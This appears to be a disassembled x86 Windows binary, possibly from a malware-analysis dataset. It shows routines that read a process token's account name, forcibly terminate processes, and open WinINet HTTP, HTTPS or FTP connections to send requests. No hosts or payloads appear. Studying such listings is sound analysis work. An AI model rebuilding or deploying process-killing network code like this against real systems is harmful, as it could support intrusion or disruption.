jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406d13
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x1
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x38 ]
shl eax 0x1
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0x38 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp - 0x20 ]
call [ GetTokenInformation@IAT ]
mov [ ebp - 0x24 ] eax
call [ GetLastError@IAT ]
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x30 ] 0x104
mov [ ebp - 0x34 ] 0x104
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0xc ]
add eax 0x104
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0xc ]
mov eax [ ebp - 0x1c ]
push [ eax ]
push 0x0
call [ LookupAccountSidA@IAT ]
mov [ ebp - 0x24 ] eax
sub_406d13
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4c ] eax
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x44 ] eax
push [ ebp - 0x44 ]
call ??3@YAXPAX@Z
pop ecx
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_406d67
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x1
push 0x1
push r--data
mov ecx [ ebp - 0xc ]
call sub_406b52
push [ ebp + 0x8 ]
push 0x1
push 0x1fffff
call [ OpenProcess@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
push 0x0
push r--data
mov ecx [ ebp - 0xc ]
call sub_406b52
mov eax [ ebp - 0x8 ]
leave
retn 0x4
push 0x0
push [ ebp - 0x4 ]
call [ TerminateProcess@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
sub_406de6
push ebp
mov ebp esp
mov eax 0x144c
call sub_409800
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x1414 ] ecx
mov ax [ r--data ]
mov [ ebp - 0x1008 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x1006 ]
push eax
call memset
add esp 0xc
mov ax [ r--data ]
mov [ ebp - 0x408 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x406 ]
push eax
call memset
add esp 0xc
mov ax [ r--data ]
mov [ ebp - 0x808 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x806 ]
push eax
call memset
add esp 0xc
mov ax [ r--data ]
mov [ ebp - 0xc08 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0xc06 ]
push eax
call memset
add esp 0xc
mov ax [ r--data ]
mov [ ebp - 0x1410 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x140e ]
push eax
call memset
add esp 0xc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x1410 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc08 ]
push eax
lea eax [ ebp - 0x808 ]
push eax
lea eax [ ebp - 0x408 ]
push eax
lea eax [ ebp - 0x1008 ]
push eax
push [ ebp + 0x8 ]
call sub_408f69
add esp 0x1c
push 0x5
push r--data
lea eax [ ebp - 0x1008 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push r--data
lea eax [ ebp - 0x1008 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x100c ] 0x2
jmp r-xdata
push 0x3
push r--data
lea eax [ ebp - 0x1008 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x100c ] 0x1
jmp r-xdata
lea eax [ ebp - 0x1410 ]
mov [ ebp - 0x1418 ] eax
mov eax [ ebp - 0x1414 ]
mov eax [ eax + 0x41c ]
mov [ ebp - 0x141c ] eax
mov eax [ ebp - 0x141c ]
mov [ ebp - 0x1420 ] eax
and [ ebp - 0x100c ] 0x0
mov eax [ ebp - 0x1418 ]
mov al [ eax ]
mov [ ebp - 0x1421 ] al
mov eax [ ebp - 0x141c ]
mov cl [ ebp - 0x1421 ]
mov [ eax ] cl
mov eax [ ebp - 0x1418 ]
inc eax
mov [ ebp - 0x1418 ] eax
mov eax [ ebp - 0x141c ]
inc eax
mov [ ebp - 0x141c ] eax
cmp [ ebp - 0x1421 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1438 ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x144c ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x808 ]
mov [ ebp - 0x1438 ] eax
jmp r-xdata
lea eax [ ebp - 0x808 ]
mov [ ebp - 0x1428 ] eax
mov eax [ ebp - 0x1428 ]
inc eax
mov [ ebp - 0x142c ] eax
lea eax [ ebp - 0x408 ]
mov [ ebp - 0x144c ] eax
jmp r-xdata
lea eax [ ebp - 0x408 ]
mov [ ebp - 0x143c ] eax
mov eax [ ebp - 0x143c ]
inc eax
mov [ ebp - 0x1440 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x1428 ]
mov al [ eax ]
mov [ ebp - 0x142d ] al
inc [ ebp - 0x1428 ]
cmp [ ebp - 0x142d ] 0x0
jne r-xdata
mov eax [ ebp - 0x1428 ]
sub eax [ ebp - 0x142c ]
mov [ ebp - 0x1434 ] eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp - 0x100c ]
push [ ebp - 0x1438 ]
push [ ebp - 0x144c ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc08 ]
push eax
mov eax [ ebp - 0x1414 ]
mov eax [ eax ]
mov ecx [ ebp - 0x1414 ]
call [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x10
mov eax [ ebp - 0x143c ]
mov al [ eax ]
mov [ ebp - 0x1441 ] al
inc [ ebp - 0x143c ]
cmp [ ebp - 0x1441 ] 0x0
jne r-xdata
mov eax [ ebp - 0x143c ]
sub eax [ ebp - 0x1440 ]
mov [ ebp - 0x1448 ] eax
je r-xdata
sub_4070d6
push ebp
mov ebp esp
push 0xffffffff
push sub_40a34a
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x5c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x11 ] 0x1
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push [ ebp + 0x1c ]
call [ InternetOpenA@IAT ]
mov ecx [ ebp - 0x28 ]
mov [ ecx + 0x410 ] eax
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x410 ] 0x0
je r-xdata
mov [ ebp - 0x1c ] r--data
push r--data
lea eax [ ebp - 0x1c ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x410 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x2c ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x15
mov eax [ ebp + 0xc ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
push 0x0
push 0x8000000
push 0x1
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x30 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
push [ eax + 0x410 ]
call [ InternetConnectA@IAT ]
mov ecx [ ebp - 0x28 ]
mov [ ecx + 0x414 ] eax
jmp r-xdata
mov [ ebp - 0x34 ] 0x50
mov eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
jmp r-xdata
mov [ ebp - 0x20 ] r--data
push r--data
lea eax [ ebp - 0x20 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x414 ] 0xffffffff
jne r-xdata
push 0x0
push 0x0
push 0x3
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x34 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
push [ eax + 0x410 ]
call [ InternetConnectA@IAT ]
mov ecx [ ebp - 0x28 ]
mov [ ecx + 0x414 ] eax
jmp r-xdata
mov [ ebp - 0x38 ] 0x1bb
mov eax [ ebp + 0xc ]
mov [ ebp - 0x38 ] eax
jmp r-xdata
push 0x0
call [ InternetAttemptConnect@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x3
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x38 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x28 ]
push [ eax + 0x410 ]
call [ InternetConnectA@IAT ]
mov ecx [ ebp - 0x28 ]
mov [ ecx + 0x414 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x420 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x24 ] r--data
push r--data
lea eax [ ebp - 0x24 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x3c ]
mov al [ eax ]
mov [ ebp - 0x45 ] al
mov eax [ ebp - 0x40 ]
mov cl [ ebp - 0x45 ]
mov [ eax ] cl
mov eax [ ebp - 0x3c ]
inc eax
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x40 ]
inc eax
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x45 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x42c ] ecx
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x424 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x28 ]
mov [ eax + 0x42c ] 0x15
jmp r-xdata
cmp [ ebp - 0x4c ] 0x1
je r-xdata
mov ecx [ ebp - 0x28 ]
call sub_4034f0
mov ecx [ ebp - 0x28 ]
call sub_4034f0
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x428 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x50 ]
mov al [ eax ]
mov [ ebp - 0x59 ] al
mov eax [ ebp - 0x54 ]
mov cl [ ebp - 0x59 ]
mov [ eax ] cl
mov eax [ ebp - 0x50 ]
inc eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x54 ]
inc eax
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x59 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ eax + 0x42c ] 0x50
jmp r-xdata
cmp [ ebp - 0x4c ] 0x2
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x11 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x18
mov eax [ ebp - 0x60 ]
mov al [ eax ]
mov [ ebp - 0x69 ] al
mov eax [ ebp - 0x64 ]
mov cl [ ebp - 0x69 ]
mov [ eax ] cl
mov eax [ ebp - 0x60 ]
inc eax
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x64 ]
inc eax
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x69 ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x430 ] ecx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ eax + 0x42c ] 0x1bb
jmp r-xdata
sub_4073c4
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x410 ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
push [ eax + 0x410 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x410 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x28 ]
push [ eax + 0x414 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x414 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x414 ] 0x0
jne r-xdata
push [ ebp - 0x18 ]
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406de1
add esp 0x10
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_407434
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x410 ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
push [ eax + 0x410 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x410 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x28 ]
push [ eax + 0x414 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x414 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x414 ] 0x0
jne r-xdata
push r--data
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406de1
add esp 0x10
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4074bf
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x418 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0x418 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x410 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push [ eax + 0x414 ]
call [ InternetCloseHandle@IAT ]
leave
retn
mov eax [ ebp - 0x4 ]
push [ eax + 0x410 ]
call [ InternetCloseHandle@IAT ]
sub_407519
push ebp
mov ebp esp
push 0xffffffff
push sub_40a365
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x11 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xa
ja r-xdata
movzx eax [ ebp - 0x11 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
jmp [ eax * 4 + jump_table_407789 ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x418 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x1c ]
and [ eax + 0x418 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x41c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x2c ] eax
push 0x0
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x20 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x20 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x20 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x1c ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x10 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x8 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x18 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x18 ]
mov [ ebp - 0x11 ] al
jmp r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov ecx [ ebp - 0x1c ]
call [ eax + 0x14 ]
mov [ ebp - 0x11 ] al
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x11 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x18
mov eax [ ebp - 0x24 ]
mov al [ eax ]
mov [ ebp - 0x2d ] al
mov eax [ ebp - 0x28 ]
mov cl [ ebp - 0x2d ]
mov [ eax ] cl
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x2d ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
sub_4076d3
mov eax [ ebp - 0x1c ]
push [ eax + 0x418 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x1c ]
and [ eax + 0x418 ] 0x0
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x430 ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x42c ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x420 ]
call sub_406de1
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40771f
mov eax [ ebp - 0x1c ]
push [ eax + 0x418 ]
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x1c ]
and [ eax + 0x418 ] 0x0
push r--data
push [ ebp + 0x8 ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x430 ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x42c ]
mov eax [ ebp - 0x1c ]
push [ eax + 0x420 ]
call sub_406de1
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4077b5
push ebp
mov ebp esp
sub esp 0xd8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x20 ] eax
push esi
push edi
mov [ ebp - 0x58 ] ecx
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x414 ] 0x0
je r-xdata
mov [ ebp - 0x30 ] r--data
push r--data
lea eax [ ebp - 0x30 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x414 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x430 ] 0x2
jne r-xdata
and [ ebp - 0x5c ] 0x0
mov [ ebp - 0x5c ] 0x800000
jmp r-xdata
mov [ ebp - 0x34 ] r--data
push r--data
lea eax [ ebp - 0x34 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x418 ] 0xffffffff
jne r-xdata
push 0x0
mov eax [ ebp - 0x5c ]
or eax 0x4000000
push eax
push 0x0
push [ ebp + 0xc ]
push r--data
push [ ebp + 0x8 ]
push r--data
mov eax [ ebp - 0x58 ]
push [ eax + 0x414 ]
call [ HttpOpenRequestA@IAT ]
mov ecx [ ebp - 0x58 ]
mov [ ecx + 0x418 ] eax
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x418 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x60 ]
inc eax
mov [ ebp - 0x64 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x58 ]
push [ eax + 0x418 ]
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
push 0x400
push 0x0
push [ ebp - 0x18 ]
call memset
add esp 0xc
mov eax [ ebp - 0x58 ]
mov eax [ eax + 0x430 ]
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x1
je r-xdata
mov eax [ ebp - 0x60 ]
mov al [ eax ]
mov [ ebp - 0x65 ] al
inc [ ebp - 0x60 ]
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov eax [ ebp - 0x60 ]
sub eax [ ebp - 0x64 ]
mov [ ebp - 0x6c ] eax
push 0x10000000
push [ ebp - 0x6c ]
push [ ebp + 0x10 ]
mov eax [ ebp - 0x58 ]
push [ eax + 0x418 ]
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov al 0x1
mov [ ebp - 0x54 ] r--data
push r--data
lea eax [ ebp - 0x54 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0x74 ] eax
cmp [ ebp - 0x70 ] 0x2
je r-xdata
mov [ ebp - 0x38 ] r--data
push r--data
lea eax [ ebp - 0x38 ]
push eax
call _CxxThrowException
mov eax [ ebp - 0x74 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x75 ] al
inc [ ebp - 0x74 ]
cmp [ ebp - 0x75 ] 0x0
jne r-xdata
mov edi [ ebp - 0x74 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x58 ]
mov eax [ eax + 0x420 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x7c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x7d ] al
inc [ ebp - 0x7c ]
cmp [ ebp - 0x7d ] 0x0
jne r-xdata
mov edi [ ebp - 0x7c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x84 ]
mov al [ eax ]
mov [ ebp - 0x89 ] al
inc [ ebp - 0x84 ]
cmp [ ebp - 0x89 ] 0x0
jne r-xdata
mov eax [ ebp - 0x84 ]
sub eax [ ebp - 0x88 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0x98 ] eax
mov eax [ ebp - 0x98 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x99 ] al
inc [ ebp - 0x98 ]
cmp [ ebp - 0x99 ] 0x0
jne r-xdata
mov edi [ ebp - 0x98 ]
mov esi [ ebp - 0x90 ]
mov eax [ ebp - 0x94 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x430 ] 0x1
jne r-xdata
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x430 ] 0x2
jne r-xdata
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x42c ] 0x50
je r-xdata
mov ax [ r--data ]
mov [ ebp - 0x2c ] ax
xor eax eax
lea edi [ ebp - 0x2a ]
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp - 0x58 ]
push [ eax + 0x42c ]
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x2c ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp - 0xa0 ]
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x42c ] 0x1bb
je r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
push 0x32
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x14 ] eax
push 0x800
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0xa0 ]
mov al [ eax ]
mov [ ebp - 0xa5 ] al
inc [ ebp - 0xa0 ]
cmp [ ebp - 0xa5 ] 0x0
jne r-xdata
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa4 ]
mov ecx [ ebp - 0xa4 ]
mov [ ebp - 0xac ] ecx
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0x18 ]
dec eax
mov [ ebp - 0xb4 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4c ] eax
push [ ebp - 0x4c ]
call ??3@YAXPAX@Z
pop ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x50 ] eax
push [ ebp - 0x50 ]
call ??3@YAXPAX@Z
pop ecx
push 0x800
push 0x0
push [ ebp - 0x10 ]
call memset
add esp 0xc
push r--data
push [ ebp - 0x1c ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x1c ]
cmp eax 0x32
jle r-xdata
mov eax [ ebp - 0xb4 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xb5 ] al
inc [ ebp - 0xb4 ]
cmp [ ebp - 0xb5 ] 0x0
jne r-xdata
mov edi [ ebp - 0xb4 ]
mov esi [ ebp - 0xac ]
mov eax [ ebp - 0xb0 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x1c ]
push [ ebp - 0x14 ]
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x14 ]
mov [ ecx + eax ] 0x0
push r--data
push [ ebp - 0x4 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0xc4 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc8 ] eax
mov eax [ ebp - 0xc8 ]
